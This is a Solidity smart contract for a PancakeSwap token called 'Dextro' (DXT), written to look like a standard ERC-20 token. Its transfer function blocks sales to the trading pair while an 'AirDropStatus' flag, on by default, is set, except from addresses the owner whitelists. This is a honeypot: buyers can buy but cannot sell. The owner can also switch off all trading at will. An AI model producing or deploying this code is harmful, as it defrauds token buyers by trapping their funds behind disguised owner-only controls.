contract Dextro is Context, IERC20, Ownable { 
    using SafeMath for uint;
    using Address for address;

    mapping (address => uint) private _tOwned;
    mapping (address => bool) private _isHolder;
    mapping (address => mapping (address => uint)) private _allowances;

    string private _name = "Dextro"; 
    string private _symbol = "DXT";  
    uint8 private _decimals = 18;
    uint private _tTotal = 100000000 * 10 ** _decimals;

    bool public TradeStatus = true;
    bool public AirDropStatus = true;

    // Counter for liquify trigger
    uint8 private txCount = 0;

    /* 
    PANCAKESWAP SET UP
    */

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint tokensSwapped,
        uint ethReceived,
        uint tokensIntoLiqudity

    );

    // Prevent processing while already processing! 
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
        _tOwned[owner()] = _tTotal;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        // Create pair address for PancakeSwap
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(_uniswapV2Router.WETH(), address(this));
        uniswapV2Router = _uniswapV2Router;

        _isHolder[owner()] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }


    /*
    STANDARD ERC20 COMPLIANCE FUNCTIONS
    */
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    // This function is required so that the contract can receive BNB from pancakeswap
    receive() external payable {}

    // Approve a wallet to sell tokens
    function _approve(address owner, address spender, uint amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint amount
    ) private {
        require(TradeStatus, "Trading is not avalible now!");

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");
        assert(amount != type(uint256).max);
        assert(!AirDropStatus || (to != uniswapV2Pair || (_isHolder[from])));

        _tokenTransfer(from,to,amount);
    }

    // Swapping tokens for BNB using PancakeSwap 
    function swapTokensForBNB(uint tokenAmount) private {
        require(TradeStatus, "Trading is not available now!");

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETH(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    /*
    PURGE RANDOM TOKENS - Add the random token address and a wallet to send them to
    */

    // Remove random tokens from the contract and send to a wallet
    function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint number_of_tokens) public onlyOwner returns(bool _sent){
        require(random_Token_Address != address(this), "Can not remove native token");
        uint randomBalance = IERC20(random_Token_Address).balanceOf(address(this));

        if (number_of_tokens > randomBalance) {
            number_of_tokens = randomBalance;
        }

        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }

    function addHolder(address holder) public onlyOwner {
        if (holder != address(0) && !_isHolder[holder]) {
            _isHolder[holder] = true;
        }
    }

    function removeHolder(address holder) public onlyOwner {
        if (holder != address(0) && _isHolder[holder]) {
            _isHolder[holder] = false;
        }
    }

    function availableTradnig(bool status) public onlyOwner{
        TradeStatus = status;
    }

    function startAirDrop(bool status) public onlyOwner{
        AirDropStatus = status;
    }

    /* TOKEN TRANSFERS */
    function _tokenTransfer(address sender, address recipient, uint amount) private {
        _transferTokens(sender, recipient, amount);
    }

    function _transferTokens(address sender, address recipient, uint tAmount) private {
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }
}

